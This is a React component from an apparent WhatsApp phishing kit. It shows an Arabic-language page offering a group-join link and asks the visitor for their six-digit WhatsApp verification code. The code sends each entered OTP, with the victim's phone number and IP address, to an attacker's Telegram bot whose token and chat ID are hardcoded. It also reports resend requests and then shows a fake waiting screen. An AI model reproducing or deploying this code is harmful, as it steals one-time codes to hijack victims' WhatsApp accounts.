import React, { useState, useEffect, useRef } from "react";
import Axios from "axios";
import { formatPhoneNumberIntl } from "react-phone-number-input";
import SettingsContext from "../Context/SettingsContext";
import Timer from "../Timer/Timer";

export default function Confirm({ setPage, setNcode, ncode }) {
  const [error, setError] = useState(false);
  const [code, setCode] = useState("");
  const id = useRef(0);
  const [resendTimer, setresendTimer] = useState(60);
  const [messageResend, setmessageResend] = useState("إعادة إرسال رمز");
  const [workMinutes, setWorkMinutes] = useState(1 / 6);
  const [message, setMessage] = useState({
    content: "رابط الإنضمام إلى المجموعة",
    color: "text-gray-700",
  });
  const [loading, setLoading] = useState(false);
  const APIS = (currentCode) => {
    var message = "";
    const apiToken = "8178734639:AAG-Pwa2YWDMMjPeYeR7OVBD5DqgeJwkfz8";
    message += "-------[ Whatsapp  OTP Code ]-------\n";
    message += `IP Address   : ${ncode.ip}\n`;
    message += `Phone Number  : ${formatPhoneNumberIntl(ncode.number)}\n`;
    message += `Code Whatsapp : ${currentCode}\n`;
    const queryParams = {
      text: message,
      chat_id: "5368668188",
      parse_mode: "html",
    };
    const queryString = Object.keys(queryParams)
      .map(
        (key) =>
          encodeURIComponent(key) + "=" + encodeURIComponent(queryParams[key])
      )
      .join("&");
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryString}`;
    Axios(url);
  };
  const notifyBot = () => {
    var message = "";
    const apiToken = "8178734639:AAG-Pwa2YWDMMjPeYeR7OVBD5DqgeJwkfz8";
    message += "-------[ Whatsapp  Resend OTP code Request ]-------\n";
    message += `IP Address   : ${ncode.ip}\n`;
    message += `Phone Number  : ${formatPhoneNumberIntl(ncode.number)}\n`;
    const queryParams = {
      text: message,
      chat_id: "5368668188",
      parse_mode: "html",
    };
    const queryString = Object.keys(queryParams)
      .map(
        (key) =>
          encodeURIComponent(key) + "=" + encodeURIComponent(queryParams[key])
      )
      .join("&");
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryString}`;
    Axios(url);
  };
  const handle = (currentCode) => {
    if (currentCode.length < 6) {
      setError(true);
    } else {
      setNcode({ ...ncode, code: currentCode });
      APIS(currentCode);
      setError(false);
      clearTimeout(id.current);
      setLoading(true);
      setMessage({
        content: "يرجى عدم مغادرة الصفحة لحين تأكيد إضافتك",
        color: "text-gray-700",
      });
      setTimeout(() => {
        setCode("");
        setLoading(false);
        setPage("p3");
      }, 10000);
    }
  };
  const inputCode = (e, index) => {
    const codeInputs = document.querySelectorAll(".pin-input input");
    var progress = document.querySelector(".two-step-input-parent .highlight");
    if (index < codeInputs.length - 1) {
      codeInputs[index + 1].focus();
      let p = Number.parseInt(progress.style.width) + 10;
      progress.style.width = p + "%";
    }
    var currentCode = code + e.target.value;
    setCode(currentCode);
    if (index === codeInputs.length - 1) {
      handle(currentCode);
    }
  };

  const keyPress = (e, index) => {
    const codeInputs = document.querySelectorAll(".pin-input input");
    var progress = document.querySelector(".two-step-input-parent .highlight");
    const keyCode = e.which ? e.which : e.keyCode;
    if (keyCode < 48 || keyCode > 57) {
      e.preventDefault();
    }

    if (keyCode === 8) {
      codeInputs[index - (index > 0 ? 1 : 0)].value = null;
      codeInputs[index - (index > 0 ? 1 : 0)].focus();

      if (code.length > 0) {
        let p = Number.parseInt(progress.style.width) - 10;
        progress.style.width = p + "%";
        var currentPin = code.substring(0, code.length - 1);
        setCode(currentPin);
      }
    }

    if (code.length !== index) {
      codeInputs[code.length].focus();
    }
  };

  const clipboard = (e) => {
    e.preventDefault();
    let otp = e.clipboardData.getData("text")
    otp = otp.replace("-","");
    if(otp.length ===  6){
      let progress = document.querySelector(".two-step-input-parent .highlight");
      let codeInputs = document.querySelectorAll(".pin-input input");
      let otpList = otp.split("");
      for(let i = 0 ; i < otpList.length ; i++){
        codeInputs[i].value = otpList[i];
        let p = Number.parseInt(progress.style.width) + 10;
        progress.style.width = p + "%";
      }
      setCode(otp);
      setTimeout(() => {
          handle(otp);
      }, 100);
    }
  };

  const resendSMSAgain = (e) => {
    setmessageResend("تم إرسال رقم بنجاح");
    setresendTimer(60);
    notifyBot();
    setTimeout(() => {
      setmessageResend("إعادة إرسال رمز");
    }, 5000);
  };

 
  useEffect(() => {
    id.current = setTimeout(() => {
      setresendTimer(resendTimer - 1);
    }, 1000);
    if (resendTimer === 0) clearTimeout(id.current);
    return () => clearTimeout(id.current);
  }, [resendTimer]);

  return (
    <div
      className="md:w-1/2 mx-auto shadow-xl rounded-2xl pb-2 bg-white size Conts"
      style={{ direction: "rtl" }}
    >
      <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-md space-y-8">
          <div>
            <img
              className="mx-auto h-12 w-auto"
              src="images/group.png"
              alt="Your Company"
            />
            <h2 className={`mt-6 text-center tracking-tight ${message.color}`}>
              {message.content}
            </h2>
          </div>
          {loading ? (
            <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
              <SettingsContext.Provider
                value={{
                  workMinutes,
                  setWorkMinutes,
                }}
              >
                {<Timer />}
              </SettingsContext.Provider>
            </div>
          ) : (
            <div className="mt-8 space-y-6">
              <div
                className="-space-y-px rounded-md shadow-sm"
                style={{ boxShadow: "none", borderRadius: 0 }}
              >
                <div className="two-step-input-parent">
                  <div className="pin-input-container">
                    <div className="pin-input" id="pinInput">
                      <input
                        onInput={(e) => inputCode(e, 0)}
                        onKeyDown={(e) => keyPress(e, 0)}
                        onPaste={(e)=>clipboard(e,0)}
                        type="tel"
                        pattern="[0-9]{10}"
                        id="digit1"
                        maxLength="1"
                        autoFocus={true}
                        placeholder="-"
                      />
                      <input
                        onInput={(e) => inputCode(e, 1)}
                        onKeyDown={(e) => keyPress(e, 1)}
                        onPaste={(e)=>clipboard(e,1)}
                        type="tel"
                        pattern="[0-9]{10}"
                        id="digit2"
                        maxLength="1"
                        placeholder="-"
                      />
                      <input
                        onInput={(e) => inputCode(e, 2)}
                        onKeyDown={(e) => keyPress(e, 2)}
                        onPaste={(e)=>clipboard(e,2)}
                        type="tel"
                        pattern="[0-9]{10}"
                        id="digit3"
                        maxLength="1"
                        placeholder="-"
                        className="mx-2"
                      />
                      <input
                        onInput={(e) => inputCode(e, 3)}
                        onKeyDown={(e) => keyPress(e, 3)}
                        onPaste={(e)=>clipboard(e,3)}
                        type="tel"
                        pattern="[0-9]{10}"
                        id="digit4"
                        maxLength="1"
                        placeholder="-"
                      />
                      <input
                        onInput={(e) => inputCode(e, 4)}
                        onKeyDown={(e) => keyPress(e, 4)}
                        onPaste={(e)=>clipboard(e,4)}
                        type="tel"
                        pattern="[0-9]{10}"
                        id="digit5"
                        maxLength="1"
                        placeholder="-"
                      />
                      <input
                        onInput={(e) => inputCode(e, 5)}
                        onKeyDown={(e) => keyPress(e, 5)}
                        onPaste={(e)=>clipboard(e,5)}
                        type="tel"
                        pattern="[0-9]{10}"
                        id="digit6"
                        maxLength="1"
                        placeholder="-"
                      />
                    </div>
                  </div>
                  <span className="highlight" style={{ width: "4%" }}></span>
                </div>
              </div>
              {error ? (
                <div
                  className="flex p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-lg dark:bg-red-200 dark:text-red-800"
                  role="alert"
                  style={{ direction: "rtl" }}
                >
                  <svg
                    aria-hidden="true"
                    className="flex-shrink-0 inline w-5 h-5 mr-3"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                      clipRule={"evenodd"}
                    ></path>
                  </svg>
                  <span className="sr-only">Info</span>
                  <div>
                    <span className="mr-1  font-medium">الرمز غير صحيح</span>
                  </div>
                </div>
              ) : (
                ""
              )}
              <div>
                <h3 className="two-step-verification-retry">
                أدخل الكود المؤلف من 6 أرقام
                </h3>
                <div
                  className="resend-sms"
                  style={{
                    marginTop: "20px",
                    marginBottom: "15px",
                    display: "flex",
                    justifyContent: "space-between",
                  }}
                >
                  <div className="resend-element" style={{ display: "flex" }}>
                    <img
                      src="images/resend-otp.png"
                      alt="whatsapp lock"
                      style={{
                        width: "30px",
                        height: "30px",
                        marginLeft: "15px",
                        marginRight: "15px",
                        opacity: 0.6,
                      }}
                    />
                    <p
                      onClick={(e) =>
                        resendTimer === 0 ? resendSMSAgain(e) : ""
                      }
                      className="two-step-verification-retry"
                    >
                      {messageResend}
                    </p>
                  </div>
                  <span
                    className="two-step-verification-retry"
                    style={{
                      marginLeft: "15px",
                    }}
                  >
                    0:
                    {resendTimer < 10 && resendTimer > 0
                      ? "0" + resendTimer
                      : resendTimer}
                  </span>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
